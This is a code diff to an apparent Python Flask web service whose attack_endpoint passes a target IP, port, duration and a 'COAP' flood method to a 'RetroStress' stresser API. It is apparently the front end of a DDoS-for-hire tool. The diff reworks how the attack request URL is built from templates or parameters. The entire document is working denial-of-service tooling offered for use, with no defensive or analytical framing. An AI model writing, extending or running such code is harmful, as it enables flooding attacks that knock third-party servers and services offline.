@@ -344,20 +344,35 @@ def attack_endpoint():
             log(f"❌ Cooldown active: {remaining}s remaining")
             return jsonify({"success": False, "reason": f"Cooldown: Wait {remaining} seconds"}), 429
         
-        # Call RetroStress API (GET request)
-        params = {
-            "key": RETROSTRESS_API_KEY,
-            "target": ip,
-            "port": port,
-            "time": duration,
-            "method": "COAP",
-            "concurrent": 1
-        }
-        
-        log(f"🔵 Calling RetroStress API: {RETROSTRESS_API_URL}")
-        
         try:
-            response = requests.get(RETROSTRESS_API_URL, params=params, timeout=30)
+            # Call RetroStress API
+            url = RETROSTRESS_API_URL
+            
+            # Check if URL is a template with placeholders
+            if "[target]" in url or "[port]" in url or "[time]" in url:
+                log("ℹ️ URL appears to be a template. Replacing placeholders.")
+                url = url.replace("[target]", ip)\
+                         .replace("[port]", str(port))\
+                         .replace("[time]", str(duration))\
+                         .replace("[method]", "COAP")
+                
+                if "key=0" in url and RETROSTRESS_API_KEY:
+                    url = url.replace("key=0", f"key={RETROSTRESS_API_KEY}")
+                    
+                log(f"🔵 Calling RetroStress API: {url}")
+                response = requests.get(url, timeout=30)
+            else:
+                # Fallback to standard params if no placeholders
+                params = {
+                    "key": RETROSTRESS_API_KEY,
+                    "host": ip, # Use host instead of target as indicated by template
+                    "port": port,
+                    "time": duration,
+                    "method": "COAP",
+                    "concurrent": 1
+                }
+                log(f"🔵 Calling RetroStress API: {RETROSTRESS_API_URL} with params")
+                response = requests.get(RETROSTRESS_API_URL, params=params, timeout=30)
             elapsed = time.time() - start_time
             
             if response.status_code == 200 or response.status_code == 201:
